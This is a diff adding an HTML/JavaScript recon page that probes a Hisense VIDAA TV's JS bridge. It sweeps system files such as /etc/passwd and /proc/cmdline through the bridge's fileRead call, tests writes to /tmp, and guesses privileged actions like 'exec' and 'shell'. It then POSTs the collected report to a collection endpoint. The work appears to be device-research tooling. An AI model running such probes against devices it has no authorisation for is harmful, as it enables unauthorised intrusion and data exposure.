@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>recon</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
+  #out { font: 19px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
+         word-break: break-all; padding: 10px; }
+  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
+</style>
+</head>
+<body>
+<div id="out"></div>
+<script>
+(function () {
+  "use strict";
+
+  // Recon probe for the VIDAA JS bridge (HiUtils_createRequest et al).
+  // Read-only except two write probes: the known-good websdk/ baseline and
+  // one file on /tmp (tmpfs — gone at reboot). Everything is POSTed to
+  // /api/recon and echoed on screen.
+
+  var el = document.getElementById("out");
+  var report = {
+    started: new Date().toISOString(),
+    ua: navigator.userAgent,
+    href: location.href,
+    bridge_functions: [],
+    files: {},
+    write_probes: {},
+    action_guesses: {},
+    xhr_file: {}
+  };
+
+  function trunc(s, n) {
+    s = String(s == null ? "" : s);
+    return s.length > n ? s.slice(0, n) + "…(" + s.length + " chars)" : s;
+  }
+
+  function line(text, cls) {
+    var d = document.createElement("div");
+    d.textContent = text;
+    if (cls) d.className = cls;
+    el.appendChild(d);
+    window.scrollTo(0, document.body.scrollHeight);
+  }
+
+  function isOk(ret) {
+    if (ret === true) return true;
+    if (typeof ret === "number") return ret !== 0;
+    if (typeof ret === "string") return ret !== "" && ret !== "0";
+    return false;
+  }
+
+  function enumBridge() {
+    var found = [];
+    var names = Object.getOwnPropertyNames(window);
+    for (var i = 0; i < names.length; i++) {
+      var n = names[i];
+      if (!/^(Hisense|Hi[A-Z]|vidaa|Vidaa|WebAPI|webapi)/i.test(n)) continue;
+      var v;
+      try { v = window[n]; } catch (e) { continue; }
+      found.push(n + ":" + typeof v);
+    }
+    return found;
+  }
+
+  // HiUtils_createRequest is synchronous per FINDINGS.md §6.
+  function hiCall(action, params) {
+    try {
+      if (typeof HiUtils_createRequest !== "function") return { error: "no bridge" };
+      var r = HiUtils_createRequest(action, params);
+      if (r && typeof r === "object") {
+        return { ret: r.ret, msg: trunc(r.msg, 20000) };
+      }
+      return { value: trunc(r, 2000) };
+    } catch (e) {
+      return { exception: String(e) };
+    }
+  }
+
+  function xhrFile(path) {
+    return new Promise(function (resolve) {
+      try {
+        var x = new XMLHttpRequest();
+        x.open("GET", path, true);
+        x.timeout = 4000;
+        x.onload = function () {
+          resolve({ status: x.status, length: (x.responseText || "").length,
+                    head: trunc(x.responseText || "", 4000) });
+        };
+        x.onerror = function () { resolve({ error: "blocked or failed" }); };
+        x.ontimeout = function () { resolve({ error: "timeout" }); };
+        x.send();
+      } catch (e) {
+        resolve({ exception: String(e) });
+      }
+    });
+  }
+
+  var READ_PATHS = [
+    "websdk/Appinfo.json",   // control — known good
+    "/etc/passwd",
+    "/etc/group",
+    "/etc/inittab",
+    "/etc/login.sh",
+    "/etc/profile",
+    "/etc/fstab",
+    "/etc/hostname",
+    "/etc/version",
+    "/etc/version.txt",
+    "/etc/firmware_version",
+    "/etc/init.d/rcS",
+    "/proc/mounts",
+    "/proc/cmdline",
+    "/proc/cpuinfo",
+    "/proc/1/cmdline",
+    "/proc/self/status",
+    "/3rd_rw/",
+    "/tmp/",
+    "/usr/bin/"
+  ];
+
+  var ACTION_GUESSES = [
+    "exec", "shell", "run", "runapp", "startapp", "getdeviceinfo",
+    "getsysinfo", "sysinfo", "getfilelist", "listdir", "readdir",
+    "installapp", "getmac", "getversion", "filelist"
+  ];
+
+  function run() {
+    line("== alvidaa recon ==");
+    line(report.ua);
+    line("page: " + report.href, "warn");
+
+    // 1. bridge surface
+    report.bridge_functions = enumBridge();
+    line("bridge: " + (report.bridge_functions.length
+        ? report.bridge_functions.join("  ") : "(none found)"),
+      report.bridge_functions.length ? "ok" : "err");
+
+    // 2. fileRead sweep
+    line("-- fileRead sweep --", "hdr");
+    for (var i = 0; i < READ_PATHS.length; i++) {
+      var p = READ_PATHS[i];
+      var r = hiCall("fileRead", { path: p, mode: 6 });
+      report.files[p] = r;
+      var ok = r && isOk(r.ret);
+      line((ok ? "[ok] " : "[--] ") + p + (ok ? ": " + trunc(r.msg, 200) : ""), ok ? "ok" : "");
+    }
+
+    // 3. write probes (baseline + one tmpfs probe, nothing persistent)
+    line("-- write probes --", "hdr");
+    var base = hiCall("fileWrite", {
+      path: "websdk/recon_probe.txt", mode: 6,
+      writedata: "alvidaa recon " + report.started
+    });
+    report.write_probes.relative = base;
+    line("[write websdk/recon_probe.txt] " + (isOk(base.ret) ? "ok (baseline)"
+        : JSON.stringify(trunc(base, 300))), isOk(base.ret) ? "ok" : "err");
+
+    var tmp = hiCall("fileWrite", {
+      path: "/tmp/alvidaa_recon_probe.txt", mode: 6,
+      writedata: "alvidaa recon " + report.started
+    });
+    report.write_probes.absolute_tmp = tmp;
+    line("[write /tmp/alvidaa_recon_probe.txt] " + (isOk(tmp.ret)
+        ? "WRITABLE — absolute paths accepted" : JSON.stringify(trunc(tmp, 300))),
+      isOk(tmp.ret) ? "ok" : "err");
+    if (isOk(tmp.ret)) {
+      var rb = hiCall("fileRead", { path: "/tmp/alvidaa_recon_probe.txt", mode: 6 });
+      report.write_probes.absolute_tmp_readback = rb;
+      line("[readback] " + trunc(rb.msg, 120), "warn");
+    }
+
+    // 4. action-name guesses — does the bridge expose anything stronger?
+    line("-- action guesses --", "hdr");
+    for (var j = 0; j < ACTION_GUESSES.length; j++) {
+      var a = ACTION_GUESSES[j];
+      var g = hiCall(a, { path: "/etc/hostname", mode: 6 });
+      report.action_guesses[a] = g;
+      if (isOk(g.ret)) line("[hit] " + a + ": " + trunc(g.msg, 200), "warn");
+    }
+
+    // 5. file:// XHR — works only in HTML5-app context on some firmwares
+    line("-- file:// XHR --", "hdr");
+    var xhrPaths = ["file:///proc/mounts", "file:///etc/passwd", "file:///etc/"];
+    var chain = Promise.resolve();
+    xhrPaths.forEach(function (fp) {
+      chain = chain.then(function () {
+        return xhrFile(fp).then(function (res) {
+          report.xhr_file[fp] = res;
+          line((res.status ? "[ok] " : "[--] ") + fp + " " +
+            JSON.stringify(trunc(res, 160)), res.status ? "ok" : "");
+        });
+      });
+    });
+
+    chain.then(function () {
+      report.finished = new Date().toISOString();
+      var body = JSON.stringify(report);
+      try {
+        var x = new XMLHttpRequest();
+        x.open("POST", "/api/recon", true);
+        x.setRequestHeader("Content-Type", "application/json");
+        x.onload = function () {
+          line("report saved (" + x.status + ", " + body.length +
+               " bytes) — view at /api/recon", "ok");
+          line("== done ==", "hdr");
+        };
+        x.onerror = function () {
+          line("could not POST report — read results from this screen", "err");
+          line("== done ==", "hdr");
+        };
+        x.send(body);
+      } catch (e) {
+        line("POST failed: " + e, "err");
+      }
+    });
+  }
+
+  run();
+})();
+</script>
+</body>
+</html>
